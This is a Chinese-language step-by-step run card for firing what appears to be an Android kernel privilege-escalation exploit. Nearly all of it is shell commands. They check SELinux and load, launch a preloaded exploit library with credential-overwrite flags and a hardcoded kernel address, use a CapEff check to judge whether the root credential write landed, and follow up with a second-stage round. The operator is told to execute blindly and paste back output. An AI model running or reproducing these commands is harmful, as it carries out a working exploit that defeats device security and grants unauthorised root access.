# mt60 零思考执行卡 · 第 3 弹（R6 重掷 + 门槛命中即补 C 轮）2026-08-16

> 规则同前：按编号复制命令 → 原样贴回全部输出 → 卡上没写的就停。
> **R5 判读已出**：编舞全通、trigger 开火、R 写没落地（随机落点，重掷即可）。
> 本卡唯一新东西：**R6 若落地，8 分钟窗口内立刻补一发 C 轮** —— 这是 mt48
> 两轮换指针协议的下半场，历史从未执行过。门槛由机器判，你只看两个词。

---

## 第 0 步 · ANR 证据补收（两弹都漏了，30 秒的事）

```sh
ls -la /data/anr/ 2>/dev/null || echo NO_ANR_DIR
cp $(ls -t /data/anr/* 2>/dev/null | head -3) /sdcard/ 2>/dev/null || true
```

目录列表贴回。有文件就随本卡末尾一起推（原文，不裁剪）。没有就贴 `NO_ANR_DIR`。

## 第 1 步 · 体检（整块复制）

```sh
date; cat /proc/sys/kernel/random/boot_id; getenforce
awk '{print ($1>600)?"SETTLE_OK":"SETTLE_WAIT"}' /proc/uptime
awk '{print ($1<3)?"LOAD_GO":"LOAD_WAIT"}' /proc/loadavg
ps -A | grep -E "sleep|preload" >/dev/null 2>&1 && echo RESIDUE_DIRTY || echo RESIDUE_CLEAN
```

三旗 = `SETTLE_OK` + `LOAD_GO` + `RESIDUE_CLEAN` → 第 2 步；否则停，整块贴回。
（`SETTLE_WAIT` 就等 10 分钟重跑本步，再不行贴回等评审。）

## 第 2 步 · 开火 R6（与 R5 一字不差，只改文件名）

```sh
am kill-all
timeout 220 env \
  PSELECT_SLIDE_TRIGGER=1 \
  PSELECT_CRED=1 PSELECT_PERF_CRED=1 \
  PSELECT_RETRY=1 \
  PSELECT_PTR_MODE=1 PSELECT_PTR_STAGE=R PSELECT_PTR_STRICT=1 \
  PSELECT_PTR_RIGHT=auto \
  PSELECT_TREE_PC=ffffff8002a41b90 PSELECT_TREE_LEFT=0 \
  PSELECT_SKIP_WARMUP=1 \
  PSELECT_WAIT_SECONDS=200 \
  LD_PRELOAD=/data/local/tmp/preload.so \
  /system/bin/sleep 180 > /data/local/tmp/R6.out 2>&1
echo "R6 rc=$? enforce=$(getenforce) boot=$(cat /proc/sys/kernel/random/boot_id)"
```

rc 是几都照贴（255 = 正常未中，3 = 哑轮，124 = 真挂）。**贴完立刻第 3 步，别等。**

## 第 3 步 · 落地门槛（机器判，只认两个词）

```sh
ls -la /data/local/tmp/mt49_child_status.txt
cat /data/local/tmp/mt49_child_status.txt
grep -q "CapEff=0000000000000000" /data/local/tmp/mt49_child_status.txt && echo R_MISS || echo R_LANDED
```

三行输出原样贴回，然后只看最后一个词：

- `R_MISS` → **跳到第 5 步**（C 轮不打：打了也无效，还留半程态）。
- `R_LANDED` → **立刻第 4 步**（子进程 8 分钟窗口在走，动作要快）。

## 第 4 步 · 补 C 轮（只在 R_LANDED 时执行；命令一个字不改）

```sh
TASK=$(grep -a "^task=" /data/local/tmp/mt49_child_status.txt | tail -1 | cut -d= -f2 | cut -d' ' -f1)
echo "C1 TASK=$TASK"
timeout 220 env \
  PSELECT_SLIDE_TRIGGER=1 \
  PSELECT_CRED=1 PSELECT_PERF_CRED=1 \
  PSELECT_RETRY=1 \
  PSELECT_PTR_MODE=1 PSELECT_PTR_STAGE=C PSELECT_PTR_STRICT=1 \
  PSELECT_PTR_RIGHT=auto \
  PSELECT_SKIP_WARMUP=1 \
  PSELECT_WAIT_SECONDS=200 \
  PSELECT_TASK=$TASK \
  LD_PRELOAD=/data/local/tmp/preload.so \
  /system/bin/sleep 180 > /data/local/tmp/C1.out 2>&1
echo "C1 rc=$? enforce=$(getenforce) boot=$(cat /proc/sys/kernel/random/boot_id)"
```

C1 跑完后补两行（root 痕迹检查）：

```sh
cat /data/local/tmp/root_alive.txt 2>/dev/null || echo NO_ROOT_MARKER
cat /data/local/tmp/mt49_child_status.txt
```

## 第 5 步 · 活体确认 + 推送

```sh
getenforce; echo "alive_rc=$?"
cat /proc/sys/kernel/random/boot_id
```

推仓库（原样，一样不许加工）：
1. 第 0 步全部输出（+ ANR 文件原文）
2. 第 1 步整块
3. `R6.out` 全文 + `R6 rc=...` 行
4. 第 3 步三行（**门槛词必须在内**）
5. 若打了 C1：`C1 TASK=` 行 + `C1.out` 全文 + `C1 rc=...` 行 + root 痕迹两行
6. 第 5 步两行

推完**停**。第 4 弹卡由评审出。

---

## 事故口令（同前）

黑屏/无响应：短按电源 ×2 等 60 秒 → 不行长按。恢复后只推 `.out` 现状 +
`getprop ro.boot.bootreason`，然后停。

## 禁止事项（同前）

不重跑、不改参数、不总结日志、不加跑轮次、不自行"再试一次"。
**特别强调：`R_MISS` 时绝不允许"顺手打个 C 试试"——无效且留半程态。**
